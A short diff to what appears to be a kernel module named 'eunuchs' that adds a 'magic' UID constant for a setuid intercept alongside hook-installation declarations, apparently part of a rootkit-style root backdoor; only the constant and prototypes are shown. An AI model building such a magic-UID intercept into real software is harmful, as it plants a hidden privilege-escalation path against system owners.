@@ -15,6 +15,9 @@
 #define EUNUCHS_DEVICE_NAME "eunuchs"
 #define EUNUCHS_CLASS_NAME "eunuchs"
 
+/* magic number for our setuid intercept */
+#define EUNUCHS_MAGIC_UID 0xdead
+
 static int eunuchs_init(void);
 static void eunuchs_exit(void);
 static int eunuchs_hooks_install(void);
